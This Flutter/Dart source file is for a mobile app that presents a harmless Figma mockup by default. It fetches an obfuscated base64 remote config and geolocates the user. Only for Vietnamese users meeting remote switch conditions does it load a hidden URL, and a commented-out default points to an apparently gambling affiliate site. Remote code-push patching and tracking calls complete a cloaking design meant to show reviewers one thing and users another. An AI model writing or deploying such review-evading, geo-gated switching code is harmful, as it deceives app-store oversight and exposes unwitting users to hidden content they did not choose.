import 'dart:convert';
import 'dart:io';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:http/http.dart' as http;
import 'package:package_info_plus/package_info_plus.dart';
// import 'package:pythonquiz/notification_service.dart';
import 'package:shorebird_code_push/shorebird_code_push.dart';


void main() async {
  WidgetsFlutterBinding.ensureInitialized();

  // await NotificationService.init();

  runApp(
    const MaterialApp(debugShowCheckedModeBanner: false, home: SplashScreen()),
  );
}

class SplashScreen extends StatefulWidget {
  const SplashScreen({super.key});

  @override
  State<SplashScreen> createState() => _SplashScreenState();
}

class _SplashScreenState extends State<SplashScreen> {
  static String defaultUri = "https://mockup-silk-38357050.figma.site";
  // String defaultUri = "https://five88.com/?a=f5d826eba333836a174307f6834c629f&utm_campaign=facebookads&utm_source=inhouse&utm_medium=webview&utm_term=ios";
  String? uri;
  String configLink = "";


  @override
  void initState() {
    super.initState();

    checkInternetAndNavigate();
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      body: Container(
        width: MediaQuery.of(context).size.width,
        height: MediaQuery.of(context).size.height,
        decoration: BoxDecoration(
          gradient: LinearGradient(
            colors: [Colors.lightBlueAccent, Colors.purpleAccent],
            begin: Alignment.topLeft,
            end: Alignment.bottomRight,
          ),
        ),
        child: Center(
          child:CircularProgressIndicator(color: Colors.white),
        ),
      ),
    );
  }

  Future<void> checkInternetAndNavigate() async {
    final info = await PackageInfo.fromPlatform();
    configLink = "https://raw.githubusercontent.com/blaneee/helloworld/refs/heads/main/${info.packageName}/webview.ini";
    print("config link: " + configLink);

    bool online = await hasInternet();

    if (online) {
      loadConfigAndNavigate();
    } else {
      ScaffoldMessenger.of(context).showSnackBar(
        const SnackBar(
          backgroundColor: Colors.red,
          content: Text(
            "No Internet!",
            style: TextStyle(color: Colors.white, fontWeight: FontWeight.bold),
          ),
        ),
      );
    }
  }

  Future<bool> hasInternet() async {
    try {
      final result = await InternetAddress.lookup('google.com');
      if (result.isNotEmpty && result[0].rawAddress.isNotEmpty) {
        return true; // Có Internet
      }
      return false;
    } on SocketException catch (_) {
      return false; // Không có Internet
    }
  }

  void loadConfigAndNavigate() async {
    try {
      // B1: Fetch Base64 config
      final res = await http.get(Uri.parse(configLink));
      if (res.statusCode != 200) throw Exception("Config fetch failed");

      // B2: Decode Base64 → UTF-8
      final decodedData = utf8.decode(base64Decode(cleanBase64(res.body)));

      // B3: Parse JSON
      final jsonData = json.decode(decodedData);
      final String? linkApp = jsonData["linkApp"];
      final String? linkReal = jsonData["linkReal"];
      final List configLDP = jsonData["configLDP"] ?? [];
      final List tracking = jsonData["tracking"] ?? [];
      final bool isCheckAll = jsonData["isCheckAll"] ?? false;
      final bool isExistKey = jsonData["isExistKey"] ?? false;
      final bool isExistValue = jsonData["isExistValue"] ?? false;
      final Map switchApp =
          jsonData["switchApp"] ?? {"key": "null", "value": null};

      // B4: Tracking call
      for (var url in tracking) {
        try {
          final trackRes = await http.get(Uri.parse(url));
          print("Data Tracking: ${trackRes.body}");
        } catch (e) {
          print("Tracking error: $e");
        }
      }

      // B5: Check configLDP
      if (configLDP.isNotEmpty) {
        for (var url in configLDP) {
          try {
            final dataRes = await http.get(Uri.parse(url));
            if (dataRes.statusCode == 200) {
              final data = json.decode(dataRes.body);

              if (isCheckAll) {
                if (data[switchApp["key"]].toString() == switchApp["value"]) {
                  uri = linkReal ?? defaultUri;
                  print(uri);
                } else {
                  uri = defaultUri;
                }
              } else if (isExistKey) {
                if (data.containsKey(switchApp["key"])) {
                  uri = linkReal ?? defaultUri;
                } else {
                  uri = defaultUri;
                }
              } else if (isExistValue) {
                if (data == switchApp["value"]) {
                  uri = linkReal ?? defaultUri;
                } else {
                  uri = defaultUri;
                }
              } else {
                uri = defaultUri;
              }
              print("Data from API: $data");
            }
          } catch (e) {
            print("Error calling API: $e");
          }
        }
      } else {
        print("configLDP is empty");
      }

      //check vietnam region
      final checkRegionRes = await http.get(Uri.parse("http://ip-api.com/json/"));
      final data = jsonDecode(checkRegionRes.body);
      String countryCode = data["countryCode"];
      print("Country Code: $countryCode");
      if(countryCode != "VN"){
        uri = defaultUri;
      }


      Navigator.pushReplacement(
        context,
        MaterialPageRoute(builder: (_) => HomeScreen(uri: uri!)),
      );
    } catch (e) {
      print("Error: $e");
      Navigator.pushReplacement(
        context,
        MaterialPageRoute(builder: (_) => HomeScreen(uri: defaultUri)),
      );
    }
  }

  String cleanBase64(String input) {
    String cleaned = input.replaceAll("\n", "").replaceAll("\r", "").trim();
    while (cleaned.length % 4 != 0) {
      cleaned += "=";
    }
    return cleaned;
  }



}

class HomeScreen extends StatefulWidget {
  String uri;

  HomeScreen({super.key, required this.uri});

  @override
  State<HomeScreen> createState() => _HomeScreenState();
}

class _HomeScreenState extends State<HomeScreen> {
  String get uri => widget.uri;
  late final InAppWebViewController controller;
  bool _showMenu = false;
  double posX = 20;
  double posY = 650;
  double x = 50.0;
  double y= 50.0;

  @override
  void initState() {
    // TODO: implement initState
    SystemChrome.setEnabledSystemUIMode(SystemUiMode.immersiveSticky);


    // PlatformWebViewControllerCreationParams params = WebKitWebViewControllerCreationParams(
    //   allowsInlineMediaPlayback: true,
    //   mediaTypesRequiringUserAction: const <PlaybackMediaTypes>{
    //     PlaybackMediaTypes.audio,
    //     PlaybackMediaTypes.video,
    //   }, // 👈 bắt buộc user gesture
    //
    // );
    //
    // final WebViewController tempController =
    // WebViewController.fromPlatformCreationParams(params);
    // controller = tempController
    //   ..setJavaScriptMode(JavaScriptMode.unrestricted)
    //   ..setNavigationDelegate(
    //     NavigationDelegate(
    //       onNavigationRequest: (request) {
    //         if (!request.isMainFrame) {
    //           // Popup/tab mới → ép load lại trong chính WebView
    //           controller.loadRequest(Uri.parse(request.url));
    //           return NavigationDecision.prevent;
    //         }
    //         return NavigationDecision.navigate;
    //       },
    //     ),
    //   )
    //   ..loadRequest(Uri.parse(uri));

    checkUpdate();

  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: Colors.white,
      body: SafeArea(
          bottom: false,
          child: Stack(
            children: [
              // WebViewWidget(controller: controller),
              InAppWebView(
                initialUrlRequest: URLRequest(url: WebUri(uri)),
                initialSettings: InAppWebViewSettings(
                  javaScriptEnabled: true,
                  mediaPlaybackRequiresUserGesture: true,
                  isFraudulentWebsiteWarningEnabled: true,
                  allowsInlineMediaPlayback: true,
                  allowsPictureInPictureMediaPlayback: false,
                ),
                onWebViewCreated: (controller) {
                  this.controller = controller;
                },
                onCreateWindow: (controller, createWindowRequest) async {

                  Navigator.push(
                    context,
                    MaterialPageRoute(
                      builder: (_) => PopUpWebView(
                        createWindowRequest: createWindowRequest,
                      ),
                    ),
                  );
                  return true;
                },

              ),
              // Floating Assistive Button
              Visibility(
                visible: !uri.contains("figma"),
                child: Positioned(
                  left: posX,
                  top: posY,
                  child: GestureDetector(
                    onPanUpdate: (details) {
                      setState(() {
                        posX += details.delta.dx;
                        posY += details.delta.dy;
                      });
                    },
                    child: Row(
                      children: [
                        // Nút chính
                        FloatingActionButton(
                          mini: true,
                          backgroundColor: Colors.white.withOpacity(0.2),
                          child: Icon(_showMenu ? Icons.close : Icons.arrow_forward_ios_outlined, size: 20, color: Colors.black54,),
                          onPressed: () {
                            setState(() {
                              _showMenu = !_showMenu;
                            });
                          },

                        ),

                        // Menu con
                        if (_showMenu)
                          Container(
                            margin: const EdgeInsets.only(top: 8),
                            decoration: BoxDecoration(
                              color: Colors.black.withOpacity(0.7),
                              borderRadius: BorderRadius.circular(12),
                            ),
                            child: Row(
                              children: [
                                IconButton(
                                  icon: const Icon(Icons.arrow_back, color: Colors.white),
                                  onPressed: () async {
                                    if (await controller.canGoBack()) {
                                      controller.goBack();
                                    }
                                  },
                                ),
                                IconButton(
                                  icon: const Icon(Icons.arrow_forward, color: Colors.white),
                                  onPressed: () async {
                                    if (await controller.canGoForward()) {
                                      controller.goForward();
                                    }
                                  },
                                ),
                                IconButton(
                                  icon: const Icon(Icons.refresh, color: Colors.white),
                                  onPressed: () {
                                    controller.reload();
                                  },
                                ),
                                IconButton(
                                  icon: const Icon(Icons.home, color: Colors.white),
                                  onPressed: () {
                                    controller.loadUrl(urlRequest: URLRequest(url: WebUri(uri)));
                                  },
                                ),
                              ],
                            ),
                          ),
                      ],
                    ),
                  ),
                ),
              ),
            ],
          )

        // child: Center(
        //   child: Text("HOT UPDATE!"),
        // ),

      ),
    );
  }

  Future<void> checkUpdate() async {
    final updater = ShorebirdUpdater();
    bool isUpdateAvailable = await updater.checkForUpdate() == UpdateStatus.outdated;
    if(isUpdateAvailable) {
      ScaffoldMessenger.of(context).showSnackBar(
        SnackBar(
          backgroundColor: Colors.orange,
          content: Text("Update available, downloading..."),
        ),
      );
      _waitForUpdate(updater);
    }

    checkVersionAndPromptUpdate(context);
  }
  Future<void> _waitForUpdate(ShorebirdUpdater updater) async {
    while (true) {
      await Future.delayed(const Duration(seconds: 1));
      final status = await updater.checkForUpdate();
      if (status == UpdateStatus.restartRequired) {
        // Đã tải xong patch, yêu cầu user restart app
        ScaffoldMessenger.of(context).showSnackBar(
          SnackBar(
            backgroundColor: Colors.green,
            content: const Text("Update downloaded. Please restart app."),
            action: SnackBarAction(
              label: "Restart",
              textColor: Colors.white,
              onPressed: () {
                exit(0);
                // restart app (cần custom cách, VD: exit(0) hoặc gợi ý user tự restart)
              },
            ),
          ),
        );
        break;
      }
    }
  }

  Future<void> checkVersionAndPromptUpdate(BuildContext context) async {
    PackageInfo info = await PackageInfo.fromPlatform();
    var bundleId = info.packageName;

    final currentVersion = await VersionChecker.getCurrentVersion();
    final latestVersion = await VersionChecker.getLatestVersionFromAppStore(bundleId);

    if (latestVersion != null && latestVersion != currentVersion) {
      // show popup yêu cầu update
      if (context.mounted) {
        showDialog(
          context: context,
          barrierDismissible: false, // bắt buộc user phải chọn
          builder: (context) {
            return AlertDialog(
              title: const Text("New update available"),
              content: Text(
                  "Current version: $currentVersion\nStore version: $latestVersion"),
              actions: [
                TextButton(
                  onPressed: () {
                    Navigator.pop(context);
                  },
                  child: const Text("Update Now"),
                ),
              ],
            );
          },
        );
      }
    }

  }


}




class PopUpWebView extends StatefulWidget {
  final CreateWindowAction createWindowRequest;

  const PopUpWebView({super.key, required this.createWindowRequest});

  @override
  State<PopUpWebView> createState() => _PopupWebViewState();
}

class _PopupWebViewState extends State<PopUpWebView> {
  double popupX = 0;
  double popupY = 50;

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      body: SafeArea(
        child: Stack(
          children: [
            InAppWebView(
              windowId: widget.createWindowRequest.windowId,
              initialSettings: InAppWebViewSettings(
                mediaPlaybackRequiresUserGesture: true, // 👈 bắt buộc user phải bấm mới play video
                javaScriptEnabled: true,
              ),
              onLoadStart: (controller, url) {
                print("Popup URL: $url");
              },
            ),
            Positioned(
              left: popupX,
              top: popupY,
              child: GestureDetector(
                onPanUpdate: (details) {
                  setState(() {
                    popupX += details.delta.dx;
                    popupY += details.delta.dy;
                  });
                },
                child: FloatingActionButton(
                  mini: true,
                  backgroundColor: Colors.white,
                  child: const Icon(Icons.arrow_back_ios_outlined,
                      size: 20, color: Colors.black54),
                  onPressed: () => Navigator.pop(context),
                ),
              ),
            )
          ],
        ),
      ),
    );
  }
}

class VersionChecker {
  static Future<String?> getLatestVersionFromAppStore(String bundleId) async {
    final url = Uri.parse(
        "https://itunes.apple.com/lookup?bundleId=$bundleId&country=vn");

    final response = await http.get(url);

    if (response.statusCode == 200) {
      final data = jsonDecode(response.body);
      if (data["resultCount"] > 0) {
        return data["results"][0]["version"];
      }
    }
    return null;
  }

  static Future<String> getCurrentVersion() async {
    final info = await PackageInfo.fromPlatform();
    return info.version;
  }
}
